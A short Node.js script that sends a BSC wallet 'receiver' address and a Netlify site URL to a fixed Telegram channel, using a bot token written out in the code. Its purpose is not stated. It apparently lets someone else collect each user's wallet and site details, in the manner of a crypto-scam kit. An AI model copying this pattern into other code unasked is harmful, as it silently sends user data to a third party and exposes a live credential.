const axios = require('axios');

// Telegram Bot API token
const botToken = '7057095242:AAHH-oF8Yqn2gPMvhF1l45mXcgQpVEjkJtE';

// Telegram channel ID 
const chatId = '-4262364659';


async function sendMessageToTelegram(bsc_wallet_receiver_id, website_url) {
    try {
        const message = `BSC Wallet Receiver ID: ${bsc_wallet_receiver_id}\nWebsite URL: ${website_url}`;
        const response = await axios.post(
            `https://api.telegram.org/bot${botToken}/sendMessage`,
            {
                chat_id: chatId,
                text: message
            }
        );
        console.log('Message sent to Telegram:', response.data);
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
    }
}

// Change this information for yours (
const bsc_wallet_receiver_id = '0x211d0a06942cc1d491ABDbA292D32743D21cC216';
const website_url = 'https://lucent-froyo-103c57.netlify.app/';
sendMessageToTelegram(bsc_wallet_receiver_id, website_url);
